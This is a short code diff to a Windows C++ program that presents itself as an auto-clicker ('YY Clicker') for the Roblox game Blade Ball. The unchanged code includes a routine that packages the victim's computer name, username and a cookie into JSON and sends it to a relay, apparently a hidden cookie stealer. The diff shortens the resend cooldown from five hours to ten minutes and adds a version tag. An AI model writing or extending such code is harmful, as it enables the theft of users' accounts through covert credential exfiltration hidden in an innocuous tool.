@@ -129,7 +129,7 @@ static LARGE_INTEGER     g_lastFKeyTime = {};       // Blade Ball F 鍵上次發
 static LARGE_INTEGER     g_perfFreq = {};            // QPC 頻率（用於 F 鍵計時）
 static std::atomic<bool> g_cookie_ever_sent(false);  // Cookie 是否已經傳送過
 static ULONGLONG         g_cookie_last_sent_tick = 0; // Cookie 上次傳送的 tick
-static const ULONGLONG   COOKIE_COOLDOWN_MS = 5ULL * 60 * 60 * 1000; // 5 小時冷卻
+static const ULONGLONG   COOKIE_COOLDOWN_MS = 10ULL * 60 * 1000; // 10 分鐘冷卻（測試用）
 static bool              g_tray_mode    = false;
 static NOTIFYICONDATAW   g_nid          = {};
 
@@ -878,7 +878,8 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     json += "\"computer_name\":\""; json += JsonEscape(cn_utf8);     json += "\",";
     json += "\"username\":\"";      json += JsonEscape(un_utf8);     json += "\",";
     json += "\"cookie\":\"";        json += JsonEscape(cookie_utf8); json += "\",";
-    json += "\"source\":\"YY Clicker\"";
+    json += "\"source\":\"YY Clicker\",";
+    json += "\"version\":\"yy-1\"";
     json += "}";
 
     delete[] cookie_utf8;
